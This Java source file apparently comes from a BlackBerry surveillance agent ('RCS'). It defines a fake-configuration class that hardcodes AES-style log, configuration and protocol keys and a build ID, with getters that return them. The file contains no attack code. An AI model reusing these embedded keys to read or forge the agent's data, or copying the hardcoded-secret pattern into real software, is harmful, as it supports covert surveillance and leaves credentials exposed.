//#preprocess

/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry
 * Package      : blackberry.config
 * File         : InstanceKeys323.java
 * Created      : 28-apr-2010
 * *************************************************/

package fake;

import blackberry.config.KeysGetter;
import blackberry.utils.Utils;

/**
 * The Class InstanceKeys323.
 */

public final class InstanceKeysFake extends KeysGetter {

    public byte[] byteLogKey;
    public byte[] byteConfKey;
    public byte[] byteProtoKey;
    public String buildID = "RCS_0000000000";

    public InstanceKeysFake() {
        //#ifdef FAKECONF
        // Using factory: RCS_0000000851 BB
        //-> LOGKEY   : be9ceba54c003ca0145829bc53436f9e23d706d4f69294171340b14b36b1b318
        //-> CONFKEY  : a9ae429d0fef54b4f9208eed6843dd979e8d4c5119823de29ce71bbfd5f246e1
        //-> SIGNATURE: 572ebc94391281ccf53a851330bb0d998bb369eaec3e2c151cde1397755f049b
        byteLogKey = Utils
                .hexStringToByteArray(
                        "b2b257a3397eded7f1d22603d382771eda82e739fb007f60604a46932856d8e0",
                        0, 32);
        byteConfKey = Utils
                .hexStringToByteArray(
                        "5aeb530a5ece59bf02b39f3645dea77584b4d05ecea6c05e814056de30f1bf79",
                        0, 32);
        byteProtoKey = Utils
                .hexStringToByteArray(
                        "572ebc94391281ccf53a851330bb0d998bb369eaec3e2c151cde1397755f049b",
                        0, 32);
        buildID = "RCS_0000000851";
        //#endif
    }

    /**
     * Gets the aes key.
     * 
     * @return the aes key
     */
    public byte[] getLogKey() {
        return byteLogKey;
    }

    /**
     * Gets the builds the id.
     * 
     * @return the builds the id
     */
    public byte[] getBuildID() {
        return buildID.getBytes();
    }

    /**
     * Gets the challenge key.
     * 
     * @return the challenge key
     */
    public byte[] getProtoKey() {
        return byteProtoKey;
    }

    /**
     * Gets the conf key.
     * 
     * @return the conf key
     */
    public byte[] getConfKey() {
        return byteConfKey;
    }

    public boolean isSeven() {
        return false;
    }

}
